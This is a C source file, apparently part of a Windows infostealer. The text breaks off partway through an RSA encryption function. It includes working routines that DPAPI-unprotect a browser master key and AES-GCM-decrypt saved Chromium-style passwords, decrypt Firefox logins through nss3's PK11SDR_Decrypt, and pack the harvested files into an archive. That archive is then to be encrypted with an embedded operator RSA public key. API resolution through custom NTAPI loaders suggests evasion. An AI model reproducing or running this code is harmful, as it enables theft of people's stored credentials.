#include "./../../include/crypto.h"
#include "./../../include/global.h"
#include "./../../include/extra.h"



// Replace this with your own key generated with the tool /extra/KeyPairGenerator.c
unsigned char PublicKey[] = {0x52, 0x53, 0x41, 0x31, 0x00, 0x08, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0xC1, 0xAE, 0x2E, 0x40, 0xED,
        0x54, 0xE2, 0x67, 0x27, 0x8C, 0xB7, 0xD0, 0xC8, 0x79, 0xA1, 0xBF, 0x26, 0x2F, 0xE2, 0x21, 0x38,
        0x01, 0x59, 0x6D, 0x77, 0xA4, 0xC1, 0x62, 0xFE, 0xEE, 0x3C, 0xAF, 0xC7, 0xF2, 0xA0, 0x98, 0x6B,
        0x34, 0xAD, 0x1C, 0xED, 0xD9, 0x4A, 0xDA, 0x58, 0x6D, 0x2F, 0x36, 0x58, 0xCB, 0xB2, 0xDC, 0x4C,
        0xFF, 0xAD, 0x23, 0xFC, 0x9A, 0x26, 0xE4, 0x05, 0xE0, 0xC7, 0xEB, 0xC4, 0x14, 0x9F, 0x5F, 0xF3,
        0x08, 0xF0, 0x24, 0x20, 0x31, 0x49, 0x1D, 0x7A, 0x4E, 0x13, 0x45, 0xAB, 0x53, 0x56, 0x70, 0x5B,
        0x8D, 0xD4, 0x12, 0x83, 0xC3, 0x7B, 0xAF, 0x96, 0xF3, 0x58, 0x8A, 0xCF, 0x92, 0xDD, 0xD5, 0xEB,
        0xC7, 0x84, 0xA2, 0x09, 0x9C, 0x8B, 0xB3, 0x28, 0xC9, 0xF3, 0x96, 0xF4, 0x17, 0x47, 0xC3, 0x3B,
        0x28, 0xBB, 0xC1, 0xFB, 0x18, 0x7D, 0x11, 0x4C, 0xAB, 0xA3, 0x2D, 0x20, 0x57, 0x24, 0x8B, 0x3A,
        0x7C, 0xF1, 0x3C, 0xCD, 0x65, 0x3B, 0x87, 0xFA, 0x71, 0x88, 0x62, 0xB1, 0x13, 0x68, 0x01, 0x18,
        0x8E, 0x38, 0x4C, 0x6B, 0x94, 0x0A, 0x2D, 0xD7, 0x33, 0xA4, 0x7F, 0x71, 0x85, 0xE5, 0x91, 0x2C,
        0x2E, 0xCA, 0x92, 0x30, 0x3C, 0x27, 0x67, 0x21, 0x2B, 0x10, 0xE5, 0x5A, 0x5C, 0x21, 0xD9, 0x9B,
        0xFD, 0x8B, 0x26, 0x45, 0xE5, 0x56, 0x81, 0xF0, 0xD6, 0xA0, 0xF5, 0x6D, 0xAE, 0xFD, 0x4D, 0x13,
        0xBC, 0xBA, 0x7C, 0x0D, 0x2E, 0x63, 0x84, 0xFE, 0xB2, 0x65, 0x5D, 0xC5, 0xF2, 0x82, 0x08, 0x81,
        0x9A, 0xDF, 0x9B, 0xA5, 0x25, 0x48, 0xD8, 0xED, 0xFE, 0xB7, 0x77, 0x4C, 0x06, 0x20, 0x74, 0x66,
        0x1F, 0xFA, 0x0A, 0xDA, 0x8A, 0xD8, 0x0B, 0x76, 0x06, 0x22, 0x0D, 0x23, 0xD4, 0x71, 0x3F, 0x7D,
        0xC5, 0x6E, 0xFC, 0x5E, 0x9F, 0x46, 0x37, 0x27, 0xF4, 0xD0, 0x95
};
const char *STATIC_KEY = "2l3jfezeh7";



int Base64DecodingFunc(const char *input, char **outputDec, DWORD *outputDecSize) {
    // Prepare the UNICODE_STRING structure for the crypt32.dll library name
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"crypt32.dll";                           // The DLL to load dynamically
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR)); // Set the length of the name
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);           // Account for null termination
    dllName.Buffer = dllNameBuffer;                                   // Point to the name buffer

    ULONG dllCharacteristics = 0; // No special characteristics for loading the DLL
    PVOID moduleHandle = NULL;    // To store the handle of the loaded DLL

    // Load crypt32.dll using NTAPI version of LoadLibrary
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);

    // Check if the DLL was loaded successfully, if not return error code -1
    if (!NT_SUCCESS(STATUS) || moduleHandle == NULL)
    {
        return -1;
    }

    // Prepare the ANSI_STRING structure for the function name "CryptStringToBinaryA"
    ANSI_STRING procName;
    CHAR procNameBuffer[] = "CryptStringToBinaryA";   // The function to be loaded
    procName.Length = (USHORT)strlen(procNameBuffer); // Set the length of the function name
    procName.MaximumLength = procName.Length + 1;     // Account for null termination
    procName.Buffer = procNameBuffer;                 // Point to the function name buffer

    PVOID CryptStringToBinaryAProcAddress = NULL; // To store the function's address

    // Get the address of the "CryptStringToBinaryA" function using NTAPI equivalent of GetProcAddress
    NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName, 0, &CryptStringToBinaryAProcAddress);

    // Check if the function address was retrieved successfully, if not unload the DLL and return error code -2
    if (!NT_SUCCESS(STATUS1) || CryptStringToBinaryAProcAddress == NULL)
    {
        UnloadLib(moduleHandle); // Unload the library if function retrieval failed
        return -2;
    }

    // Cast the retrieved function address to the correct function pointer type
    CryptStringToBinaryFunc pCryptStringToBinary = (CryptStringToBinaryFunc)CryptStringToBinaryAProcAddress;

    DWORD cryptFlags = CRYPT_STRING_BASE64; // Specify that the input is Base64 encoded

    // First call to the function to determine the size of the decoded output buffer
    if (!pCryptStringToBinary(input, 0, cryptFlags, NULL, outputDecSize, NULL, NULL))
    {
        UnloadLib(moduleHandle); // Unload the DLL if the function fails
        return -4;               // Return error code -4
    }

    // Allocate memory for the decoded output based on the size determined in the previous step
    *outputDec = (char *)HeapAlloc(GetProcessHeap(), HEAP_NO_SERIALIZE, (*outputDecSize) * sizeof(char));

    // If memory allocation fails, unload the DLL and return error code -5
    if (!*outputDec)
    {
        UnloadLib(moduleHandle); // Unload the DLL if allocation fails
        return -5;
    }

    // Second call to actually decode the Base64 input into the allocated output buffer
    if (!pCryptStringToBinary(input, 0, cryptFlags, (BYTE *)*outputDec, outputDecSize, NULL, NULL))
    {
        // If the decoding fails, free the allocated memory, unload the DLL, and return error code -6
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, *outputDec);
        UnloadLib(moduleHandle); // Unload the DLL if decoding fails
        return -6;
    }

    // Unload the crypt32.dll library after the decoding is done
    UnloadLib(moduleHandle);

    // Return 0 to indicate success
    return 0;
}

int Base64EncodingFunc(const BYTE *inputBin, DWORD inputBinSize, char *outputB64, DWORD outputB64Size) {
    // Prepare the UNICODE_STRING structure for the crypt32.dll library name
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"crypt32.dll";                           // The DLL to load dynamically
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR)); // Set the length of the name
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);           // Account for null termination
    dllName.Buffer = dllNameBuffer;                                   // Point to the name buffer

    ULONG dllCharacteristics = 0; // No special characteristics for loading the DLL
    PVOID moduleHandle = NULL;    // To store the handle of the loaded DLL

    // Load crypt32.dll using NTAPI version of LoadLibrary
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);

    // Check if the DLL was loaded successfully, if not return error code -1
    if (!NT_SUCCESS(STATUS) || moduleHandle == NULL) {
        return -1;
    }

    // Prepare the ANSI_STRING structure for the function name "CryptBinaryToStringA"
    ANSI_STRING procName;
    CHAR procNameBuffer[] = "CryptBinaryToStringA";   // The function to be loaded
    procName.Length = (USHORT)strlen(procNameBuffer); // Set the length of the function name
    procName.MaximumLength = procName.Length + 1;     // Account for null termination
    procName.Buffer = procNameBuffer;                 // Point to the function name buffer

    PVOID CryptBinaryToStringAProcAddress = NULL; // To store the function's address

    // Get the address of the "CryptBinaryToStringA" function using NTAPI equivalent of GetProcAddress
    NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName, 0, &CryptBinaryToStringAProcAddress);

    // Check if the function address was retrieved successfully, if not unload the DLL and return error code -2
    if (!NT_SUCCESS(STATUS1) || CryptBinaryToStringAProcAddress == NULL) {
        UnloadLib(moduleHandle); // Unload the library if function retrieval failed
        return -2;
    }

    // Cast the retrieved function address to the correct function pointer type
    CryptBinaryToStringFunc pCryptBinaryToString = (CryptBinaryToStringFunc)CryptBinaryToStringAProcAddress;

    DWORD cryptFlags = CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF; // Specify that output should be Base64 encoded

    // Call the CryptBinaryToStringA to encode the binary input into Base64 directly into the provided buffer
    if (!pCryptBinaryToString(inputBin, inputBinSize, cryptFlags, outputB64, &outputB64Size)) {
        UnloadLib(moduleHandle); // Unload the DLL if encoding fails
        return -4;
    }

    // Null-terminate the output string manually
    outputB64[outputB64Size] = '\0';

    // Unload the crypt32.dll library after the encoding is done
    UnloadLib(moduleHandle);

    // Return 0 to indicate success
    return 0;
}


NTSTATUS AES_256_GCM(const BYTE *encryptedData, ULONG encryptedDataLength, const BYTE *aad, ULONG aadLength, const BYTE *iv, ULONG ivLength, const BYTE *authTag, ULONG authTagLength, const BYTE *key, ULONG keyLength, BYTE *decryptedData, ULONG decryptedDataLength)
{
    // Dynamically load bcrypt.dll using NTAPI equivalent of LoadLibrary.
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"bcrypt.dll";                            // The DLL containing cryptographic functions
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR)); // Set length of DLL name
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);           // Account for null terminator
    dllName.Buffer = dllNameBuffer;                                   // Set the buffer to point to the DLL name

    ULONG dllCharacteristics = 0; // No special characteristics for loading the DLL
    PVOID moduleHandle = NULL;    // Handle for the loaded module

    // Load bcrypt.dll and check if it was loaded successfully.
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
    if (!NT_SUCCESS(STATUS) || moduleHandle == NULL)
    {
        return -1; // Return error if the DLL was not loaded
    }

    // Retrieve the address of BCryptOpenAlgorithmProvider function from bcrypt.dll.
    ANSI_STRING procName;
    CHAR procNameBuffer[] = "BCryptOpenAlgorithmProvider";
    procName.Length = (USHORT)strlen(procNameBuffer); // Set function name length
    procName.MaximumLength = procName.Length + 1;     // Account for null terminator
    procName.Buffer = procNameBuffer;                 // Set the buffer to point to the function name

    PVOID BCryptOpenAlgorithmProviderProcAddress = NULL; // Address for the function

    NTSTATUS STATUS0 = GetProcAdd(moduleHandle, &procName, 0, &BCryptOpenAlgorithmProviderProcAddress);
    if (!NT_SUCCESS(STATUS0) || BCryptOpenAlgorithmProviderProcAddress == NULL)
    {
        UnloadLib(moduleHandle); // Unload the DLL if function loading failed
        return -2;               // Return error if unable to load the function
    }

    // Define function pointer for BCryptOpenAlgorithmProvider
    BCryptOpenAlgorithmProvider_t pBCryptOpenAlgorithmProvider = (BCryptOpenAlgorithmProvider_t)BCryptOpenAlgorithmProviderProcAddress;

    // Retrieve the address of BCryptSetProperty function from bcrypt.dll.
    ANSI_STRING procName1;
    CHAR procNameBuffer1[] = "BCryptSetProperty";
    procName1.Length = (USHORT)strlen(procNameBuffer1);
    procName1.MaximumLength = procName1.Length + 1;
    procName1.Buffer = procNameBuffer1;

    PVOID BCryptSetPropertyProcAddress = NULL;
    NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName1, 0, &BCryptSetPropertyProcAddress);
    if (!NT_SUCCESS(STATUS1) || BCryptSetPropertyProcAddress == NULL)
    {
        UnloadLib(moduleHandle);
        return -3;
    }

    BCryptSetProperty_t pBCryptSetProperty = (BCryptSetProperty_t)BCryptSetPropertyProcAddress;

    // Retrieve the address of BCryptGenerateSymmetricKey function from bcrypt.dll.
    ANSI_STRING procName2;
    CHAR procNameBuffer2[] = "BCryptGenerateSymmetricKey";
    procName2.Length = (USHORT)strlen(procNameBuffer2);
    procName2.MaximumLength = procName2.Length + 1;
    procName2.Buffer = procNameBuffer2;

    PVOID BCryptGenerateSymmetricKeyProcAddress = NULL;
    NTSTATUS STATUS2 = GetProcAdd(moduleHandle, &procName2, 0, &BCryptGenerateSymmetricKeyProcAddress);
    if (!NT_SUCCESS(STATUS2) || BCryptGenerateSymmetricKeyProcAddress == NULL)
    {
        UnloadLib(moduleHandle);
        return -4;
    }

    BCryptGenerateSymmetricKey_t pBCryptGenerateSymmetricKey = (BCryptGenerateSymmetricKey_t)BCryptGenerateSymmetricKeyProcAddress;

    // Retrieve the address of BCryptDecrypt function from bcrypt.dll.
    ANSI_STRING procName3;
    CHAR procNameBuffer3[] = "BCryptDecrypt";
    procName3.Length = (USHORT)strlen(procNameBuffer3);
    procName3.MaximumLength = procName3.Length + 1;
    procName3.Buffer = procNameBuffer3;

    PVOID BCryptDecryptProcAddress = NULL;
    NTSTATUS STATUS3 = GetProcAdd(moduleHandle, &procName3, 0, &BCryptDecryptProcAddress);
    if (!NT_SUCCESS(STATUS3) || BCryptDecryptProcAddress == NULL)
    {
        UnloadLib(moduleHandle);
        return -4;
    }

    BCryptDecrypt_t pBCryptDecrypt = (BCryptDecrypt_t)BCryptDecryptProcAddress;

    // Retrieve the address of BCryptDestroyKey function from bcrypt.dll.
    ANSI_STRING procName4;
    CHAR procNameBuffer4[] = "BCryptDestroyKey";
    procName4.Length = (USHORT)strlen(procNameBuffer4);
    procName4.MaximumLength = procName4.Length + 1;
    procName4.Buffer = procNameBuffer4;

    PVOID BCryptDestroyKeyProcAddress = NULL;
    NTSTATUS STATUS4 = GetProcAdd(moduleHandle, &procName4, 0, &BCryptDestroyKeyProcAddress);
    if (!NT_SUCCESS(STATUS4) || BCryptDestroyKeyProcAddress == NULL)
    {
        UnloadLib(moduleHandle);
        return -4;
    }

    BCryptDestroyKey_t pBCryptDestroyKey = (BCryptDestroyKey_t)BCryptDestroyKeyProcAddress;

    // Retrieve the address of BCryptCloseAlgorithmProvider function from bcrypt.dll.
    ANSI_STRING procName5;
    CHAR procNameBuffer5[] = "BCryptCloseAlgorithmProvider";
    procName5.Length = (USHORT)strlen(procNameBuffer5);
    procName5.MaximumLength = procName5.Length + 1;
    procName5.Buffer = procNameBuffer5;

    PVOID BCryptCloseAlgorithmProviderProcAddress = NULL;
    NTSTATUS STATUS5 = GetProcAdd(moduleHandle, &procName5, 0, &BCryptCloseAlgorithmProviderProcAddress);
    if (!NT_SUCCESS(STATUS5) || BCryptCloseAlgorithmProviderProcAddress == NULL)
    {
        UnloadLib(moduleHandle);
        return -4;
    }

    BCryptCloseAlgorithmProvider_t pBCryptCloseAlgorithmProvider = (BCryptCloseAlgorithmProvider_t)BCryptCloseAlgorithmProviderProcAddress;

    // Check if all required function addresses were loaded successfully.
    if (!BCryptGenerateSymmetricKeyProcAddress || !BCryptSetPropertyProcAddress || !BCryptGenerateSymmetricKeyProcAddress || !BCryptDecryptProcAddress || !BCryptDestroyKeyProcAddress || !BCryptCloseAlgorithmProviderProcAddress)
    {
        UnloadLib(moduleHandle); // Unload the DLL if any function is missing
        return -1;               // Return error if one or more function addresses were not loaded
    }

    // Open the AES algorithm provider and initialize necessary handles.
    NTSTATUS status = 0;
    DWORD bytesDone = 0;
    BCRYPT_ALG_HANDLE algHandle = 0;
    status = pBCryptOpenAlgorithmProvider(&algHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status))
    {
        UnloadLib(moduleHandle); // Unload the DLL on failure
        return status;           // Return error if provider couldn't be opened
    }

    // Set the algorithm's chaining mode to GCM (Galois/Counter Mode).
    status = pBCryptSetProperty(algHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status))
    {
        pBCryptCloseAlgorithmProvider(algHandle, 0); // Close the provider on failure
        UnloadLib(moduleHandle);                     // Unload the DLL
        return status;                               // Return error
    }

    // Generate a symmetric key for decryption using the provided key material.
    BCRYPT_KEY_HANDLE keyHandle = 0;
    status = pBCryptGenerateSymmetricKey(algHandle, &keyHandle, NULL, 0, (PUCHAR)key, keyLength, 0);
    if (!NT_SUCCESS(status))
    {
        pBCryptCloseAlgorithmProvider(algHandle, 0); // Close provider on failure
        UnloadLib(moduleHandle);                     // Unload the DLL
        return status;                               // Return error if key generation fails
    }

    // Initialize authenticated cipher mode information for GCM.
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)iv;     // Set IV (nonce)
    authInfo.cbNonce = ivLength;       // Set IV length
    authInfo.pbTag = (PUCHAR)authTag;  // Set authentication tag
    authInfo.cbTag = authTagLength;    // Set tag length
    authInfo.pbAuthData = (PUCHAR)aad; // Set additional authenticated data (AAD)
    authInfo.cbAuthData = aadLength;   // Set AAD length

    // Decrypt the data using the symmetric key and GCM parameters.
    status = pBCryptDecrypt(keyHandle, (PUCHAR)encryptedData, encryptedDataLength, &authInfo, NULL, 0, decryptedData, decryptedDataLength, &bytesDone, 0);

    // Clean up: destroy the key and close the algorithm provider.
    pBCryptDestroyKey(keyHandle);
    pBCryptCloseAlgorithmProvider(algHandle, 0);
    UnloadLib(moduleHandle); // Unload the DLL once finished

    return status; // Return final status, success or failure
}

int AES_256_GCM_Setup(char *key, char *ciphertext, DWORD ciphertextSize, char *plaintext)
{
    // Decode the key + remove DPAPI suffix from the start.
    char *Base64DecodedKey = NULL;
    DWORD Base64DecodedKeySize;
    Base64DecodingFunc(key, &Base64DecodedKey, &Base64DecodedKeySize);
    Base64DecodedKey += 5;
    Base64DecodedKeySize -= 5;

    // Start decrypting the secret key.
    DATA_BLOB input, output;
    input.pbData = (BYTE *)Base64DecodedKey;
    input.cbData = Base64DecodedKeySize;
    CRYPTPROTECT_PROMPTSTRUCT promptStruct;
    promptStruct.dwPromptFlags = CRYPTPROTECT_PROMPT_ON_UNPROTECT;
    promptStruct.hwndApp = NULL;
    promptStruct.szPrompt = NULL;
    promptStruct.cbSize = sizeof(CRYPTPROTECT_PROMPTSTRUCT);
    DWORD flags = CRYPTPROTECT_UI_FORBIDDEN | CRYPTPROTECT_VERIFY_PROTECTION;

    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"crypt32.dll"; // Name of the DLL.
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
    dllName.Buffer = dllNameBuffer;
    ULONG dllCharacteristics = 0;
    PVOID moduleHandle = NULL;
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
    if (NT_SUCCESS(STATUS) || moduleHandle != NULL)
    {
        ANSI_STRING procName;
        CHAR procNameBuffer[] = "CryptUnprotectData";
        procName.Length = (USHORT)strlen(procNameBuffer);
        procName.MaximumLength = procName.Length + 1;
        procName.Buffer = procNameBuffer;
        PVOID CryptUnprotectDataProcAddress = NULL;
        NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName, 0, &CryptUnprotectDataProcAddress);
        if (!NT_SUCCESS(STATUS1) || CryptUnprotectDataProcAddress == NULL)
        {
            UnloadLib(moduleHandle);
            return -2;
        }
        CryptUnprotectDataFunc pCryptUnprotectData = (CryptUnprotectDataFunc)CryptUnprotectDataProcAddress;
        pCryptUnprotectData(&input, NULL, NULL, NULL, &promptStruct, flags, &output);
    }
    else
    {
        INFO("Something went wrong in loading crypt32.dll, can not decrypt DPAPI key.");
        return 1;
    }
    char *secret_key = output.pbData;
    int secret_keySize = output.cbData;

    char iv[13];
    for (int i = 0; i < 13; i++)
    {
        iv[i] = ciphertext[i + 3];
    }
    iv[12] = '\0';

    DWORD passwordSize = ciphertextSize - 15 - 16;
    char password[passwordSize + 1];
    for (int i = 0; i < passwordSize; i++)
    {
        password[i] = ciphertext[i + 15];
    }

    DWORD authTagSize = 16;
    char authTag[authTagSize];
    for (int i = 0; i < authTagSize; i++)
    {
        authTag[i] = ciphertext[i + (ciphertextSize - 16)];
    }

    BYTE aad[] = {};
    BYTE decryptedData[passwordSize];
    ULONG decryptedDataLength = passwordSize;

    NTSTATUS status = AES_256_GCM(password, passwordSize, aad, 0, iv, 12, authTag, authTagSize, secret_key, secret_keySize, decryptedData, decryptedDataLength);
    if (NT_SUCCESS(status))
    {

        decryptedData[decryptedDataLength] = '\0';
        strcpy(plaintext, decryptedData);
    }
    else
    {
        INFO("Decryption failed with status: %08x", status);
        return 1;
    }
    return 0;
}

int Decrypt_NSS3(char *profile_path, char *crypted, char **outcrypt)
{
    // Load the nss3.dll file to use the NSS3 decryption functions. (We have already changed dir so the dll exists!)
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"nss3.dll";
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
    dllName.Buffer = dllNameBuffer;
    ULONG dllCharacteristics = 0;
    PVOID moduleHandle = NULL;
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
    if (!NT_SUCCESS(STATUS) || moduleHandle == NULL)
    {
        WARN("Error occured in loading of nss3.dll");
        return -1;
    }

    // Retrieve the address of the NSS_Init function from nss3.dll
    ANSI_STRING procName;
    CHAR procNameBuffer[] = "NSS_Init";
    procName.Length = (USHORT)strlen(procNameBuffer);
    procName.MaximumLength = procName.Length + 1;
    procName.Buffer = procNameBuffer;
    PVOID NSS_InitProcAddress = NULL;
    NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName, 0, &NSS_InitProcAddress);
    if (!NT_SUCCESS(STATUS1) || NSS_InitProcAddress == NULL)
    {
        WARN("Error occured in getting address of NSS_Init");
        UnloadLib(moduleHandle);
        return 1;
    }
    NSS_InitFunc *NSS_Init = (NSS_InitFunc *)NSS_InitProcAddress;

    // Retrieve the address of the PK11SDR_Decrypt function from nss3.dll
    ANSI_STRING procName1;
    CHAR procNameBuffer1[] = "PK11SDR_Decrypt";
    procName1.Length = (USHORT)strlen(procNameBuffer1);
    procName1.MaximumLength = procName1.Length + 1;
    procName1.Buffer = procNameBuffer1;
    PVOID PK11SDR_DecryptProcAddress = NULL;
    NTSTATUS STATUS2 = GetProcAdd(moduleHandle, &procName1, 0, &PK11SDR_DecryptProcAddress);
    if (!NT_SUCCESS(STATUS2) || PK11SDR_DecryptProcAddress == NULL)
    {
        WARN("Error occured in getting address of PK11SDR_Decrypt");
        UnloadLib(moduleHandle);
        return 1;
    }
    PK11SDR_DecryptFunc *PK11SDR_Decrypt = (PK11SDR_DecryptFunc *)PK11SDR_DecryptProcAddress;

    // Initialize NSS.
    SECStatus result = NSS_Init(profile_path);
    if (result != SECSuccess)
    {
        WARN("NSS_Init returned non 0 integer...");
        UnloadLib(moduleHandle);
        return 1;
    }

    // Base64 decode the encoded ciphertext.
    char *encrypted_data = NULL;
    DWORD dword_encrypted_data = 0;
    Base64DecodingFunc(crypted, &encrypted_data, &dword_encrypted_data);

    // Decrypt the ciphertext using NSS3.
    SECItem pInSecItem, pOutSecItem;
    pInSecItem.data = (unsigned char *)encrypted_data;
    pInSecItem.len = dword_encrypted_data;
    pOutSecItem.data = NULL;
    pOutSecItem.len = 0;
    SECStatus rv = PK11SDR_Decrypt(&pInSecItem, &pOutSecItem, NULL);
    if (pOutSecItem.data != NULL || (pOutSecItem.len != 0))
    {
        char DecryptData[pOutSecItem.len + 1];
        size_t n = pOutSecItem.len;
        *outcrypt = malloc(n * sizeof(char));
        sprintf(*outcrypt, "%.*s\n", pOutSecItem.len, pOutSecItem.data);
        UnloadLib(moduleHandle);
        return 0;
    }
    else
    {
        WARN("Error occurred during decryption with status: %08x", rv);
        UnloadLib(moduleHandle);
        return 1;
    }
}

int CompressFile(const WCHAR **Files, size_t numFiles, const WCHAR *OutputPath) {
    // Load the ole32 library using custom NtAPI LoadLibrary function.
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"ole32.dll";                           // The DLL to load.
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
    dllName.Buffer = dllNameBuffer;
    ULONG dllCharacteristics = 0;
    PVOID moduleHandle = NULL;
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
    if (!NT_SUCCESS(STATUS) || moduleHandle == NULL) { return -1; }



    // Get function addresses.
    ANSI_STRING procName;
    CHAR procNameBuffer[] = "StgCreateDocfile"; // Name of the function we're trying to get the address of.
    procName.Length = (USHORT)strlen(procNameBuffer);
    procName.MaximumLength = procName.Length + 1;
    procName.Buffer = procNameBuffer;
    PVOID StgCreateDocfileProcAddress = NULL;
    NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName, 0, &StgCreateDocfileProcAddress);
    if (!NT_SUCCESS(STATUS1) || StgCreateDocfileProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
    StgCreateDocfileFunc StgCreateDocfile = (StgCreateDocfileFunc)StgCreateDocfileProcAddress;

    ANSI_STRING procName1;
    CHAR procNameBuffer1[] = "CoInitialize"; // Name of the function we're trying to get the address of.
    procName1.Length = (USHORT)strlen(procNameBuffer1);
    procName1.MaximumLength = procName1.Length + 1;
    procName1.Buffer = procNameBuffer1;
    PVOID CoInitializeProcAddress = NULL;
    NTSTATUS STATUS2 = GetProcAdd(moduleHandle, &procName1, 0, &CoInitializeProcAddress);
    if (!NT_SUCCESS(STATUS2) || CoInitializeProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
    CoInitializeFunc CoInitialize = (CoInitializeFunc)CoInitializeProcAddress;

    ANSI_STRING procName2;
    CHAR procNameBuffer2[] = "CoUninitialize"; // Name of the function we're trying to get the address of.
    procName2.Length = (USHORT)strlen(procNameBuffer2);
    procName2.MaximumLength = procName2.Length + 1;
    procName2.Buffer = procNameBuffer2;
    PVOID CoUninitializeProcAddress = NULL;
    NTSTATUS STATUS3 = GetProcAdd(moduleHandle, &procName2, 0, &CoUninitializeProcAddress);
    if (!NT_SUCCESS(STATUS3) || CoUninitializeProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
    CoUninitializeFunc CoUninitialize = (CoUninitializeFunc)CoUninitializeProcAddress;

    if (!StgCreateDocfile || !CoInitialize || !CoUninitialize) { wprintf(L"Failed to get required function pointers.\n"); UnloadLib(moduleHandle); return -2; }

    // Initialize COM
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        wprintf(L"Failed to initialize COM library. Error: 0x%08X\n", hr);
        UnloadLib(moduleHandle);
        return 1;
    }

    // Create the storage file
    WCHAR ZipFilePath[MAX_PATH];
    _snwprintf(ZipFilePath, MAX_PATH, L"%s\\BIZ.zip", OutputPath);

    IStorage *pStorage = NULL;
    hr = StgCreateDocfile(ZipFilePath, STGM_CREATE | STGM_WRITE | STGM_SHARE_EXCLUSIVE, 0, &pStorage);
    if (FAILED(hr)) {
        wprintf(L"Failed to create storage file at '%s'. Error: 0x%08X\n", ZipFilePath, hr);
        CoUninitialize();
        UnloadLib(moduleHandle);
        return 1;
    }

    // Use the CreateStream and Release functions from the storage vtable
    CreateStreamFunc CreateStream = (CreateStreamFunc)pStorage->lpVtbl->CreateStream;
    ReleaseFunc ReleaseStorage = (ReleaseFunc)pStorage->lpVtbl->Release;

    // Iterate through the files to compress them
    for (size_t i = 0; i < numFiles; ++i) {
        const WCHAR *filePath = Files[i];
        WCHAR *fileName = wcsrchr(filePath, L'\\');
        if (fileName) {
            fileName++;  // Skip the backslash
        } else {
            fileName = (WCHAR *)filePath;  // No backslash, use the file itself
        }

        IStream *pStream = NULL;

        // Create a stream in the storage
        hr = CreateStream(pStorage, fileName, STGM_CREATE | STGM_WRITE | STGM_SHARE_EXCLUSIVE, 0, 0, &pStream);
        if (FAILED(hr)) {
            wprintf(L"Failed to create stream for file: %s. Error: 0x%08X\n", fileName, hr);
            continue;
        }

        // Use the Write and Release functions from the stream vtable
        WriteFunc WriteStream = (WriteFunc)pStream->lpVtbl->Write;
        ReleaseFunc ReleaseStream = (ReleaseFunc)pStream->lpVtbl->Release;

        // Open the source file for reading
        HANDLE hFile = CreateFileW(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            wprintf(L"Failed to open source file: %s. Error: 0x%08X\n", filePath, GetLastError());
            ReleaseStream((IUnknown*)pStream);
            continue;
        }

        // Read the source file and write to the stream
        char buffer[8192];
        DWORD bytesRead;
        ULONG bytesWritten;
        while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
            hr = WriteStream(pStream, buffer, bytesRead, &bytesWritten);
            if (FAILED(hr)) {
                wprintf(L"Failed to write to stream. Error: 0x%08X\n", hr);
                break;
            }
        }

        // Clean up
        CloseHandle(hFile);
        ReleaseStream((IUnknown*)pStream);
    }

    // Release the storage
    ReleaseStorage((IUnknown*)pStorage);
    CoUninitialize();
    UnloadLib(moduleHandle);
}

int RSAEncrypt(char *file, char *fileOut) {
    INFO("Starting to encrypt ZIP file with AES; and RSA encrypting AES encryption key.");

    // Dynamically load bcrypt.dll using NTAPI equivalent of LoadLibrary.
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"bcrypt.dll";                            // The DLL containing cryptographic functions
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR)); // Set length of DLL name
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);           // Account for null terminator
    dllName.Buffer = dllNameBuffer;                                   // Set the buffer to point to the DLL name

